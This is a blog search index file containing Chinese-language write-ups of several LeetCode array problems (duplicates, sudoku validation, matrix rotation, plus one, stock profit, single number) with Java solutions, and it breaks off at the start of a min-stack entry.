<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>26. 删除排序数组中的重复项</title>
    <url>/2020/03/26/LeetCode/leetcode-000026.%20%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E9%A1%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个排序数组，你需要在 原地 删除重复出现的元素，使得每个元素只出现一次，返回移除后数组的新长度。</p>
<p>不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给定数组 nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>], </span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 <span class="number">2</span>, 并且原数组 nums 的前两个元素被修改为 <span class="number">1</span>, <span class="number">2</span>。 </span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给定 nums = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>],</span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 <span class="number">5</span>, 并且原数组 nums 的前五个元素被修改为 <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>。</span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>为什么返回数值是整数，但输出的答案是数组呢?</p>
<p>请注意，输入数组是以「引用」方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。</p>
<p>你可以想象内部操作如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// nums 是以“引用”方式传递的。也就是说，不对实参做任何拷贝</span></span><br><span class="line"><span class="keyword">int</span> len = removeDuplicates(nums);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在函数里修改输入数组对于调用者是可见的。</span></span><br><span class="line"><span class="comment">// 根据你的函数返回的长度, 它会打印出数组中该长度范围内的所有元素。</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    print(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>采用快慢指针，一个指向当前元素，一个指向其后一个元素，如果后一个值和当前值相同，再后移，直到两个指针的值不一致为止。交换当前元素后一个位置和后一个指针位置的值，直到数组末尾。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeDuplicates</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>;j &lt; nums.length;j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[j] != nums[i]) &#123;</span><br><span class="line">				i++;</span><br><span class="line">				nums[i] = nums[j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>36. 有效的数独</title>
    <url>/2020/03/26/LeetCode/leetcode-000036-%E6%9C%89%E6%95%88%E7%9A%84%E6%95%B0%E7%8B%AC/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>判断一个 9x9 的数独是否有效。只需要根据以下规则，验证已经填入的数字是否有效即可。</p>
<pre><code>数字 1-9 在每一行只能出现一次。
数字 1-9 在每一列只能出现一次。
数字 1-9 在每一个以粗实线分隔的 3x3 宫内只能出现一次。</code></pre><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/ff/Sudoku-by-L2G-20050714.svg/250px-Sudoku-by-L2G-20050714.svg.png" alt></p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[</span><br><span class="line">  [&quot;5&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;,&quot;9&quot;,&quot;5&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;9&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;3&quot;],</span><br><span class="line">  [&quot;4&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;],</span><br><span class="line">  [&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;8&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;4&quot;,&quot;1&quot;,&quot;9&quot;,&quot;.&quot;,&quot;.&quot;,&quot;5&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;9&quot;]</span><br><span class="line">]</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[</span><br><span class="line">  [<span class="string">"8"</span>,<span class="string">"3"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"7"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],</span><br><span class="line">  [<span class="string">"6"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"1"</span>,<span class="string">"9"</span>,<span class="string">"5"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],</span><br><span class="line">  [<span class="string">"."</span>,<span class="string">"9"</span>,<span class="string">"8"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"6"</span>,<span class="string">"."</span>],</span><br><span class="line">  [<span class="string">"8"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"6"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"3"</span>],</span><br><span class="line">  [<span class="string">"4"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"8"</span>,<span class="string">"."</span>,<span class="string">"3"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"1"</span>],</span><br><span class="line">  [<span class="string">"7"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"2"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"6"</span>],</span><br><span class="line">  [<span class="string">"."</span>,<span class="string">"6"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"2"</span>,<span class="string">"8"</span>,<span class="string">"."</span>],</span><br><span class="line">  [<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"4"</span>,<span class="string">"1"</span>,<span class="string">"9"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"5"</span>],</span><br><span class="line">  [<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"8"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"7"</span>,<span class="string">"9"</span>]</span><br><span class="line">]</span><br><span class="line">输出: <span class="keyword">false</span></span><br><span class="line">解释: 除了第一行的第一个数字从 <span class="number">5</span> 改为 <span class="number">8</span> 以外，空格内其他数字均与 示例<span class="number">1</span> 相同。</span><br><span class="line">     但由于位于左上角的 <span class="number">3</span>x3 宫内有两个 <span class="number">8</span> 存在, 因此这个数独是无效的。。</span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><p>一个有效的数独（部分已被填充）不一定是可解的。<br>只需要根据以上规则，验证已经填入的数字是否有效即可。<br>给定数独序列只包含数字 1-9 和字符 ‘.’ 。<br>给定数独永远是 9x9 形式的。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：遍历"><a href="#解法一：遍历" class="headerlink" title="解法一：遍历"></a>解法一：遍历</h3><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidSudoku</span><span class="params">(<span class="keyword">char</span>[][] board)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (board == <span class="keyword">null</span> || board.length &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (board[i][j] != <span class="string">'.'</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (!isValidHelp(board, board[i][j], i, j)) &#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidHelp</span><span class="params">(<span class="keyword">char</span>[][] board, <span class="keyword">char</span> c, <span class="keyword">int</span> row, <span class="keyword">int</span> column)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (board == <span class="keyword">null</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (board[i][column] == c &amp;&amp; i != row) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; column; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (board[row][i] == c &amp;&amp; i != column) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> n = row / <span class="number">3</span>;</span><br><span class="line">		<span class="keyword">int</span> m = column / <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 注意这里 *3 + 3 开始没注意我合并成 n*4 了 卡了很久</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = n * <span class="number">3</span>; i &lt; n * <span class="number">3</span> + <span class="number">3</span>; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = m * <span class="number">3</span>; j &lt; m * <span class="number">3</span> + <span class="number">3</span>; j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (board[i][j] == c) &#123;</span><br><span class="line">					<span class="comment">// 判断是否是自己</span></span><br><span class="line">					<span class="keyword">if</span> (i != row &amp;&amp; j != column) &#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>48. 旋转图像</title>
    <url>/2020/03/26/LeetCode/leetcode-000048-%E6%97%8B%E8%BD%AC%E5%9B%BE%E5%83%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个 <em>n</em> × <em>n</em> 的二维矩阵表示一个图像。</p>
<p>将图像顺时针旋转 90 度。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 matrix &#x3D; </span><br><span class="line">[</span><br><span class="line">  [1,2,3],</span><br><span class="line">  [4,5,6],</span><br><span class="line">  [7,8,9]</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line">原地旋转输入矩阵，使其变为:</span><br><span class="line">[</span><br><span class="line">  [7,4,1],</span><br><span class="line">  [8,5,2],</span><br><span class="line">  [9,6,3]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给定 matrix =</span><br><span class="line">[</span><br><span class="line">  [ <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>,<span class="number">11</span>],</span><br><span class="line">  [ <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>,<span class="number">10</span>],</span><br><span class="line">  [<span class="number">13</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>],</span><br><span class="line">  [<span class="number">15</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">16</span>]</span><br><span class="line">], </span><br><span class="line"></span><br><span class="line">原地旋转输入矩阵，使其变为:</span><br><span class="line">[</span><br><span class="line">  [<span class="number">15</span>,<span class="number">13</span>, <span class="number">2</span>, <span class="number">5</span>],</span><br><span class="line">  [<span class="number">14</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>],</span><br><span class="line">  [<span class="number">12</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">9</span>],</span><br><span class="line">  [<span class="number">16</span>, <span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li>你必须在<strong><a href="https://baike.baidu.com/item/原地算法" target="_blank" rel="noopener">原地</a></strong>旋转图像，这意味着你需要直接修改输入的二维矩阵。<strong>请不要</strong>使用另一个矩阵来旋转图像。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：转置-翻转"><a href="#解法一：转置-翻转" class="headerlink" title="解法一：转置+翻转"></a>解法一：转置+翻转</h3><p>转置矩阵，然后翻转每一行</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> n = matrix.length;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// transpose matrix</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; n; j++) &#123;</span><br><span class="line">				<span class="keyword">int</span> tmp = matrix[j][i];</span><br><span class="line">				matrix[j][i] = matrix[i][j];</span><br><span class="line">				matrix[i][j] = tmp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// reverse each row</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n / <span class="number">2</span>; j++) &#123;</span><br><span class="line">				<span class="keyword">int</span> tmp = matrix[i][j];</span><br><span class="line">				matrix[i][j] = matrix[i][n - j - <span class="number">1</span>];</span><br><span class="line">				matrix[i][n - j - <span class="number">1</span>] = tmp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>66. 加一</title>
    <url>/2020/03/26/LeetCode/leetcode-000066-%E5%8A%A0%E4%B8%80/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个由整数组成的非空数组所表示的非负整数，在该数的基础上加一。</p>
<p>最高位数字存放在数组的首位， 数组中每个元素只存储单个数字。</p>
<p>你可以假设除了整数 0 之外，这个整数不会以零开头。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,2,3]</span><br><span class="line">输出: [1,2,4]</span><br><span class="line">解释: 输入数组表示数字 123。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [4,3,2,1]</span><br><span class="line">输出: [4,3,2,2]</span><br><span class="line">解释: 输入数组表示数字 4321。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>加一无外乎两种情况：</p>
<ul>
<li>加上之后没有超过9；</li>
<li>加上之后超过9需要进位</li>
</ul>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] plusOne(<span class="keyword">int</span>[] digits) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = digits.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">			digits[i]++;</span><br><span class="line">			digits[i] = digits[i] % <span class="number">10</span>;</span><br><span class="line">			<span class="keyword">if</span> (digits[i] != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> digits;</span><br><span class="line">		&#125;</span><br><span class="line">		digits = <span class="keyword">new</span> <span class="keyword">int</span>[digits.length + <span class="number">1</span>];</span><br><span class="line">		digits[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">return</span> digits;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>122. 买卖股票的最佳时机 II</title>
    <url>/2020/03/26/LeetCode/leetcode-000122.%20%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E4%BD%B3%E6%97%B6%E6%9C%BA%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。</p>
<p>设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。</p>
<p>注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">7</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br><span class="line">输出: <span class="number">7</span></span><br><span class="line">解释: 在第 <span class="number">2</span> 天（股票价格 = <span class="number">1</span>）的时候买入，在第 <span class="number">3</span> 天（股票价格 = <span class="number">5</span>）的时候卖出, 这笔交易所能获得利润 = <span class="number">5</span>-<span class="number">1</span> = <span class="number">4</span> 。</span><br><span class="line">     随后，在第 <span class="number">4</span> 天（股票价格 = <span class="number">3</span>）的时候买入，在第 <span class="number">5</span> 天（股票价格 = <span class="number">6</span>）的时候卖出, 这笔交易所能获得利润 = <span class="number">6</span>-<span class="number">3</span> = <span class="number">3</span> 。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">输出: <span class="number">4</span></span><br><span class="line">解释: 在第 <span class="number">1</span> 天（股票价格 = <span class="number">1</span>）的时候买入，在第 <span class="number">5</span> 天 （股票价格 = <span class="number">5</span>）的时候卖出, 这笔交易所能获得利润 = <span class="number">5</span>-<span class="number">1</span> = <span class="number">4</span> 。</span><br><span class="line">     注意你不能在第 <span class="number">1</span> 天和第 <span class="number">2</span> 天接连购买股票，之后再将它们卖出。</span><br><span class="line">     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">7</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">输出: <span class="number">0</span></span><br><span class="line">解释: 在这种情况下, 没有交易完成, 所以最大利润为 <span class="number">0</span>。</span><br></pre></td></tr></table></figure>

<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>股票必须在卖出去之后才能再次买入。基于这个限制，分析题目可知。针对股票走势[1,2,3,4,5].在第一天以价格1买入，第二天以价格2卖出，第二天以价格2买入，第三天以价格2卖出，所获取的收益，是和第一天以价格1买入，第三天以价格3卖出的收益是一致的，都是2。</p>
<p>因此，是不是只要计算这个数组里面的升序数组之间的差值就行了？</p>
<p>在看看数组[7,1,5,3,4,6]。找出它的升序数组，1，3，4，6。它在1买入，3的时候卖出，再买入，4的时候卖出，再买入，6的时候卖出，所获取的收益就是7。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; ++i) &#123;</span><br><span class="line">			<span class="keyword">int</span> delta = prices[i] - prices[i - <span class="number">1</span>];</span><br><span class="line">			<span class="keyword">if</span> (delta &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				p += delta;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>136. 只出现一次的数字</title>
    <url>/2020/03/26/LeetCode/leetcode-000136.%20%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p>
<p>说明：</p>
<p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [2,2,1]</span><br><span class="line">输出: 1</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [4,1,2,1,2]</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure>
<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用异或的特性。<br>任何数和自身异或为0，任何数和0异或，为其本身。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        result ^= nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：优化空间复杂度"><a href="#解法二：优化空间复杂度" class="headerlink" title="解法二：优化空间复杂度"></a>解法二：优化空间复杂度</h3><p>不使用变量result，直接使用数组的第一个元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        nums[<span class="number">0</span>] ^= nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>155. 最小栈</title>
    <url>/2020/03/26/LeetCode/leetcode-000155-%E6%9C%80%E5%B0%8F%E6%A0%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>设计一个支持 push，pop，top 操作，并能在常数时间内检索到最小元素的栈。</p>
<pre><code>push(x) -- 将元素 x 推入栈中。
pop() -- 删除栈顶的元素。
top() -- 获取栈顶元素。
getMin() -- 检索栈中的最小元素。</code></pre><h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MinStack minStack &#x3D; new MinStack();</span><br><span class="line">minStack.push(-2);</span><br><span class="line">minStack.push(0);</span><br><span class="line">minStack.push(-3);</span><br><span class="line">minStack.getMin();   --&gt; 返回 -3.</span><br><span class="line">minStack.pop();</span><br><span class="line">minStack.top();      --&gt; 返回 0.</span><br><span class="line">minStack.getMin();   --&gt; 返回 -2.</span><br></pre></td></tr></table></figure>

